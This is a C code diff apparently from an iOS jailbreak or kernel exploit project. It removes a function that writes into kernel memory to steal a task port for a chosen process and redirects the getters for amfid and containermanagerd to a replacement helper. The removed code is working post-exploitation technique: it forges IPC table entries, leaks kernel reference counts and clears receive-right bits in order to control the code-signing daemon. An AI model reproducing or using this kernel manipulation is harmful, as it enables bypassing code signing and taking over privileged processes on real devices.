@@ -31,37 +31,6 @@ uint64_t get_proc_ipc_table(uint64_t proc) {
   return is_table;
 }
 
-/* give ourselves a send right to this proc's task port */
-mach_port_t proc_to_task_port1(uint64_t proc) {
-  // allocate a new raw mach port:
-  mach_port_t p = MACH_PORT_NULL;
-  mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
-  mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
-
-  uint64_t ports = get_proc_ipc_table(proc);
-  
-  // get the task port:
-  uint64_t task_port = rk64(ports + 0x18); // first port's ie_object
-  // leak some refs:
-  wk32(task_port+4, 0x383838);
-  
-  uint64_t task_t = rk64(proc + struct_proc_task_offset);
-  // leak some refs
-  wk32(task_t + struct_task_ref_count_offset, 0x393939);
-  
-  // get the address of the ipc_port of our newly allocate port
-  uint64_t ipc_table = get_proc_ipc_table(currentproc);
-  // point the port's ie_object to amfid's task port:
-  wk64(ipc_table + ((p >> 8) * 0x18), task_port);
-  
-  // remove our receive right:
-  uint32_t ie_bits = rk32(ipc_table + ((p >> 8) * 0x18) + 8);
-  ie_bits &= ~(1<<17); // clear MACH_PORT_TYPE(MACH_PORT_RIGHT_RECEIVE)
-  wk32(ipc_table + ((p >> 8) * 0x18) + 8, ie_bits);
-  
-  return p;
-}
-
 uint64_t proc_port_name_to_port_ptr(uint64_t proc, mach_port_name_t port_name) {
   uint64_t ports = get_proc_ipc_table(proc);
   uint32_t port_index = port_name >> 8;
@@ -69,12 +38,18 @@ uint64_t proc_port_name_to_port_ptr(uint64_t proc, mach_port_name_t port_name) {
   return port;
 }
 
-mach_port_t get_amfid_task_port(){
-  return proc_to_task_port1(amfid_proc);
+mach_port_t get_amfid_task_port() {
+  mach_port_t amfid_task_port;
+  bool success = proc_to_task_port(&amfid_task_port, amfid_proc);
+  assert(success);
+  return amfid_task_port;
 }
 
 mach_port_t get_containermanagerd_task_port(){
-  return proc_to_task_port1(containermanager_proc);
+  mach_port_t containermanagerd_task_port;
+  bool success = proc_to_task_port(&containermanagerd_task_port, containermanager_proc);
+  assert(success);
+  return containermanagerd_task_port;
 }
 
 /*
